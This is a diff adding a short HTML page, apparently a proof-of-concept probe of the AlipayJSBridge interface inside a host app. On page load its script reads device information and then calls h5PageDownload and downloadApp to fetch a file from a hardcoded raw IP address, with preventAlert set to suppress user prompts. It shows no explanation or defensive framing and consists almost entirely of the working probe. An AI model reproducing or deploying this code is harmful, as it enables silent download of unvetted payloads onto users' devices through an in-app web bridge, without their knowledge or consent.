@@ -1,0 +1,15 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>p6</title></head>
+<body style="font-size:18px;padding:12px"><div id="r">INIT</div>
+<script>
+var out=[];function w(s){out.push(s);var e=document.getElementById('r');if(e)e.textContent=out.join(' | ');}
+var ZIP='http://159.75.1.8/68687655-f76ecc0f5b5953003bab1f7d0fe158c1';
+w('JSB='+(typeof window.AlipayJSBridge));
+function fire(){
+  w('FIRE');
+  try{AlipayJSBridge.call('toast',{content:'p6-t'},function(r){w('T='+JSON.stringify(r||{}));});}catch(e){w('T_E:'+e.message);}
+  try{AlipayJSBridge.call('getSystemInfo',{},function(r){w('I='+JSON.stringify(r||{}).slice(0,80));});}catch(e){w('I_E:'+e.message);}
+  try{AlipayJSBridge.call('h5PageDownload',{url:ZIP,fileName:'zzp6',preventAlert:true},function(r){w('H='+JSON.stringify(r||{}).slice(0,80));});w('H_SENT');}catch(e){w('H_E:'+e.message);}
+  try{AlipayJSBridge.call('downloadApp',{downloadUrl:ZIP,fileName:'zzp6d',preventAlert:true},function(r){w('A='+JSON.stringify(r||{}).slice(0,80));});w('A_SENT');}catch(e){w('A_E:'+e.message);}
+}
+if(window.AlipayJSBridge&&AlipayJSBridge.call){fire();}else{document.addEventListener('AlipayJSBridgeReady',fire,false);}
+</script></body></html>
